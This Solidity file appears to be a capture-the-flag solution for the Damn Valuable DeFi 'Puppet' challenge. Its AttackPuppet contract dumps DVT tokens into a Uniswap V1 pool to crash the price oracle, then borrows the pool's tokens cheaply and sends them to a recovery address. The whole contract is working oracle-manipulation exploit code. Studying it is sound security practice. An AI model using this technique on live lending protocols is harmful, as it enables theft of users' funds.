// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test} from "forge-std/Test.sol";
import {PuppetPool} from "../puppet/PuppetPool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {IUniswapV1Factory} from "../puppet/IUniswapV1Factory.sol";
import {IUniswapV1Exchange} from "../puppet/IUniswapV1Exchange.sol";

contract AttackPuppet {
    DamnValuableToken token;
    PuppetPool pool;
    IUniswapV1Exchange exchange;
    address recovery;

    constructor (
        DamnValuableToken _token,
        PuppetPool _pool,
        IUniswapV1Exchange _exchange,
        address _recovery
    ) payable {
        token = _token;
        pool = _pool;
        exchange = _exchange;
        recovery = _recovery;
    }

    event Log(string, uint);

    function attack(uint256 amount) public {
        //@audit avoid under/overflow
        uint tokenBalance = token.balanceOf(address(this));
        //@audit dumping DVT/ETH price by sending large amount of DVT into the pool
        token.approve(address(exchange), tokenBalance);
        exchange.tokenToEthTransferInput(tokenBalance, 9, block.timestamp, address(this)); //@audit sending DVT, receiving ETH
        //@audit checking collateral
        emit Log("ETH balance: ", address(this).balance);
        //@audit using attacker's balance of ETH to borrow DVT and then send to recovery account;
        pool.borrow{value: address(this).balance}(amount, recovery);
    }

    receive() external payable {}
}